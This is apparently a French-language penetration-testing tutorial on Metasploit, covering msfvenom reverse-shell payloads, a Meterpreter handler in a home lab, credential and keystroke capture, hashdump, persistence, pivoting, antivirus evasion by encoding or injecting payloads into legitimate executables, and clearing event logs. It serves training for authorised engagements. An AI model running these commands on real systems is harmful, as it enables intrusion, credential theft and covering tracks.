# Guide Metasploit - Approche Professionnelle

Guide complet pour passer des scripts pedagogiques simples a Metasploit Framework pour un usage professionnel.

## Pourquoi Metasploit?

### Comparaison: Script Simple vs Metasploit

| Aspect | Script Simple | Metasploit Meterpreter |
|--------|---------------|------------------------|
| **Encryption** | Aucune (texte clair) | HTTPS, mTLS disponible |
| **Detection** | Tres facile | Evasion integree |
| **Post-Exploitation** | Limitee | 100+ modules |
| **Gestion Sessions** | 1 seule | Multiple simultanes |
| **Pivoting** | Non | Oui |
| **Port Forwarding** | Non | Oui |
| **Screenshot** | Non | Oui |
| **Keylogging** | Non | Oui |
| **Logging** | Manuel | Automatique |
| **Cleanup** | Manuel | Integre |
| **Accepte par clients** | Non | Oui |
| **Support** | Aucun | Communaute + docs |

**CONCLUSION: Pour engagements reels, TOUJOURS utiliser Metasploit**

---

## Installation

### Sur Kali Linux (Pre-installe)

```bash
# Verifier installation
msfconsole -v

# Mettre a jour
sudo apt update
sudo apt install metasploit-framework
```

### Sur autres systemes Linux

```bash
# Methode 1: Installer via script officiel
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Methode 2: Via apt (Debian/Ubuntu)
sudo apt update
sudo apt install metasploit-framework
```

### Initialisation de la base de donnees

```bash
# Initialiser PostgreSQL database
sudo msfdb init

# Verifier status
sudo msfdb status

# Si probleme, reinitialiser
sudo msfdb delete
sudo msfdb init
```

---

## Anatomie de Metasploit

### Composants Principaux

```
metasploit-framework/
├── msfconsole          # Interface principale
├── msfvenom            # Generateur de payloads
├── msfdb               # Gestion base de donnees
├── modules/
│   ├── exploits/       # Exploits
│   ├── payloads/       # Payloads (shells, meterpreter)
│   ├── auxiliary/      # Modules auxiliaires (scan, etc.)
│   ├── post/           # Post-exploitation
│   └── encoders/       # Encodage pour evasion
```

### Terminologie

**Exploit:** Code qui exploite une vulnerabilite
**Payload:** Code execute apres exploitation (notre shell)
**Auxiliary:** Modules sans payload (scan, fuzzers, etc.)
**Post:** Modules post-exploitation
**Encoder:** Encode le payload pour evasion

---

## Workflow Metasploit - Lab

### Scenario: Obtenir Shell sur Windows Lab

```
[Kali - Attaquant]           [Windows - Cible]
192.168.100.10               192.168.100.20

1. Generer payload
2. Transferer vers cible
3. Executer payload
4. Recevoir connexion Meterpreter
5. Post-exploitation
```

### Etape 1: Generer Payload avec msfvenom

**msfvenom** = MSF Payload Generator

```bash
# Payload Windows 64-bit reverse TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.10 \
    LPORT=4444 \
    -f exe \
    -o lab-payload.exe

# Options expliquees:
# -p = payload
# windows/x64/meterpreter/reverse_tcp = payload specifique
# LHOST = votre IP (listener)
# LPORT = votre port
# -f exe = format executable Windows
# -o = fichier output
```

**Payload cree:**
- Fichier: `lab-payload.exe`
- Taille: ~72 KB
- Architecture: Windows 64-bit
- Type: Meterpreter reverse TCP

**Variantes de payloads:**

```bash
# Reverse HTTPS (encryp)
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.100.10 LPORT=443 -f exe -o payload-https.exe

# Reverse TCP sans staging (plus gros mais plus stable)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
    LHOST=192.168.100.10 LPORT=4444 -f exe -o payload-stageless.exe

# Powershell (pas d'executable)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.10 LPORT=4444 -f psh -o payload.ps1
```

### Etape 2: Transferer vers Windows

**Methode Python HTTP Server:**

**Sur Kali:**
```bash
# Demarrer serveur HTTP
python3 -m http.server 8000
```

**Sur Windows:**
```powershell
# Telecharger payload
Invoke-WebRequest -Uri "http://192.168.100.10:8000/lab-payload.exe" `
    -OutFile "C:\Lab\lab-payload.exe"
```

### Etape 3: Configurer Listener (Handler)

**Sur Kali - Demarrer msfconsole:**

```bash
msfconsole
```

**Dans msfconsole:**

```
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.100.10

msf6 exploit(multi/handler) > set LPORT 4444

msf6 exploit(multi/handler) > show options

# Verifier configuration
# Tout doit correspondre au payload genere

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.100.10:4444
[*] Waiting for incoming connections...
```

**Alternative - Mode console unique:**

```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.100.10; set LPORT 4444; exploit"
```

### Etape 4: Executer Payload sur Windows

**Sur Windows:**

```powershell
cd C:\Lab
.\lab-payload.exe
```

**IMPORTANT:**
- Windows Defender doit etre desactive (lab only!)
- Firewall desactive (lab only!)
- Sinon, payload sera bloque

### Etape 5: Session Meterpreter Active!

**Sur Kali, vous verrez:**

```
[*] Sending stage (200774 bytes) to 192.168.100.20
[*] Meterpreter session 1 opened (192.168.100.10:4444 -> 192.168.100.20:xxxxx)

meterpreter >
```

**Vous avez maintenant une session Meterpreter!**

---

## Commandes Meterpreter Essentielles

### Informations Systeme

```
meterpreter > sysinfo
Computer        : DESKTOP-XXXXX
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

meterpreter > getuid
Server username: DESKTOP-XXXXX\User

meterpreter > getpid
Current pid: 1234
```

### Navigation Systeme de Fichiers

```
meterpreter > pwd
C:\Lab

meterpreter > ls
Listing: C:\Lab
================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  73802 fil   2024-01-15 10:30:00 +0100  lab-payload.exe

meterpreter > cd C:\Users\User\Documents
meterpreter > pwd
C:\Users\User\Documents

meterpreter > cat secret.txt
This is a secret file!

meterpreter > download secret.txt /tmp/
[*] Downloading: secret.txt -> /tmp/secret.txt
[*] Downloaded 23 bytes

meterpreter > upload /tmp/tool.exe C:\Temp\tool.exe
[*] Uploading: /tmp/tool.exe -> C:\Temp\tool.exe
[*] Uploaded 50.0 KB
```

### Execution de Commandes

```
meterpreter > execute -f cmd.exe -i
Process 5678 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.xxxx]

C:\Lab>whoami
desktop-xxxxx\user

C:\Lab>exit

meterpreter > shell
Process 9012 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19045.xxxx]

C:\Lab>ipconfig
...

C:\Lab>exit
meterpreter >
```

### Post-Exploitation

```
# Screenshot
meterpreter > screenshot
Screenshot saved to: /tmp/screenshot.jpeg

# Keylogger
meterpreter > keyscan_start
Starting the keystroke sniffer...

meterpreter > keyscan_dump
Dumping captured keystrokes...
password123<CR>
```

### Privilege Escalation

```
meterpreter > getprivs
Enabled Process Privileges:
==========================
SeShutdownPrivilege
SeChangeNotifyPrivilege
...

# Tenter elevation (necessite vulnerabilite)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Pivoting et Port Forwarding

```
# Lister interfaces reseau
meterpreter > ifconfig

# Ajouter route vers autre sous-reseau
meterpreter > route add 10.0.0.0 255.255.255.0 1

# Port forwarding local
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.10
[*] Local TCP relay created: :3389 <-> 10.0.0.10:3389

# Maintenant on peut RDP via tunnel
# rdesktop 127.0.0.1:3389
```

### Persistence (Lab Only!)

```
# Installer persistence (pour apprentissage uniquement!)
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.100.10
[*] Creating a persistent agent: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\xxxxx
[*] Installed into C:\Windows\TEMP\xxxxx.vbs

# ATTENTION: Toujours nettoyer apres!
# Supprimer la cle de registre
# Supprimer le fichier .vbs
```

### Gestion de Sessions

```
# Backgrounder session
meterpreter > background
[*] Backgrounding session 1...

msf6 exploit(multi/handler) > sessions
Active sessions
===============
  Id  Name  Type                     Information        Connection
  --  ----  ----                     -----------        ----------
  1         meterpreter x64/windows  User @ DESKTOP...  192.168.100.10:4444 -> 192.168.100.20 (192.168.100.20)

# Interagir avec session
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >

# Killer session
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 192.168.100.20 - Meterpreter session 1 closed.
```

---

## Modules Post-Exploitation

### Enumeration

```
# Enumerer le systeme
meterpreter > run post/windows/gather/enum_system

# Collecter credentials
meterpreter > run post/windows/gather/credentials/credential_collector

# Enumerer applications installees
meterpreter > run post/windows/gather/enum_applications

# Hashdump (si SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

### Lateral Movement

```
# Scanner reseau local
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.100.0/24

# Scanner ports sur autre machine
meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=192.168.100.30 PORTS=1-1000
```

---

## Logging et Reporting

### Enregistrer Session

**Avant de demarrer handler:**

```
msf6 > spool /tmp/metasploit-session-log.txt
[*] Spooling to file /tmp/metasploit-session-log.txt...

# Maintenant toutes commandes et output sont loggees

msf6 > use exploit/multi/handler
...
# Faire vos tests
...

msf6 > spool off
[*] Spooling stopped
```

**Fichier log contient tout:**
- Commandes executees
- Output des commandes
- Sessions ouvertes/fermees
- Timestamps

### Integration avec Toolkit Professionnel

```bash
# Logger dans engagement
python ../utilities/engagement-logger.py --log "Obtained Meterpreter session" \
    --category post-exploitation \
    --target "192.168.100.20" \
    --severity high \
    --details "Meterpreter session established, enumerated system, captured credentials hash"

# Ajouter au rapport
python ../reporting/report-generator.py --add-finding \
    --title "Remote code execution successful - Meterpreter access" \
    --severity critical \
    --cvss "9.8" \
    --description "Successfully obtained Meterpreter session on target system" \
    --impact "Full system compromise, credential theft, lateral movement possible" \
    --remediation "Patch vulnerability, deploy EDR, network segmentation" \
    --poc "See Metasploit log: /tmp/metasploit-session-log.txt"
```

---

## Evasion et Obfuscation

### Encoder Payload

```bash
# Lister encoders disponibles
msfvenom -l encoders

# Encoder avec shikata_ga_nai (populaire)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.10 LPORT=4444 \
    -e x64/xor_dynamic \
    -i 5 \
    -f exe \
    -o payload-encoded.exe

# -e = encoder
# -i = iterations (plus = mieux mais plus gros)
```

### Template Injection

```bash
# Injecter dans executable legitime
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.100.10 LPORT=4444 \
    -x /path/to/legitimate.exe \
    -k \
    -f exe \
    -o payload-injected.exe

# -x = template executable
# -k = keep template behavior
```

**ATTENTION:**
- Evasion basique seulement
- EDR modernes detectent quand meme
- Pour engagements reels: Veil, Shellter, ou custom
- Toujours tester avant deploiement

---

## Comparaison: Lab Simple vs Metasploit

### Test Parallele

**Setup:**
1. Window 1 (Kali): Listener Python simple
2. Window 2 (Kali): Metasploit handler
3. Windows: Tester les deux

**Observations:**

| Aspect | Script Simple | Metasploit |
|--------|---------------|------------|
| Taille payload | ~5 KB (script PS1) | ~72 KB (exe) |
| Connexion | Immediate | Staging (2 etapes) |
| Interaction | Basique | Riche |
| Commandes | Shell PowerShell | Meterpreter + Shell |
| Stabilite | Fragile | Robuste |
| Detection | Facile | Moins facile |
| Encryption | Aucune | Disponible |

**Dans Wireshark:**

**Script simple:**
- Tout en texte clair
- Commandes lisibles
- Resultats lisibles

**Meterpreter (TCP):**
- Donnees binaires
- Moins facilement lisible
- Mais toujours detectable sans HTTPS

**Meterpreter (HTTPS):**
- Trafic HTTPS normal
- Difficilement distinguable
- Meilleure evasion

---

## Bonnes Pratiques Professionnelles

### Pour Engagements Clients

1. **Toujours utiliser HTTPS:**
   ```
   set payload windows/x64/meterpreter/reverse_https
   set LPORT 443
   ```

2. **Logger completement:**
   ```
   spool /path/to/client-engagement-log.txt
   ```

3. **Documenter IoCs:**
   - Hash du payload
   - IPs utilisees
   - Timestamps
   - Actions effectuees

4. **Cleanup:**
   ```
   meterpreter > clearev  # Clear event logs (si autorise)
   meterpreter > rm uploaded-tools.exe
   # Supprimer artefacts
   ```

5. **Reporting:**
   - Screenshots de preuves
   - Output de commandes
   - Recommendations precises

### Ressources d'Apprentissage

**Documentation officielle:**
- https://docs.metasploit.com/
- https://www.offensive-security.com/metasploit-unleashed/

**Livres:**
- "Metasploit: The Penetration Tester's Guide"
- "Mastering Metasploit"

**Pratique:**
- Metasploitable 2/3 (VMs vulnerables)
- HackTheBox machines Windows
- TryHackMe - Metasploit rooms

---

## Conclusion

**Vous avez appris:**
1. Pourquoi Metasploit est superieur aux scripts simples
2. Comment generer et deployer payloads
3. Commandes Meterpreter essentielles
4. Post-exploitation avec modules
5. Logging et reporting professionnels

**Prochaines etapes:**
1. Pratiquer dans votre lab
2. Comparer avec scripts simples
3. Tester detection (Defender ON)
4. Apprendre modules post-exploitation
5. Preparer OSCP avec Metasploit

**RAPPEL: Pour engagements reels, TOUJOURS Metasploit (ou equivalent pro)**

---

**Metasploit = Standard de l'industrie pour post-exploitation**
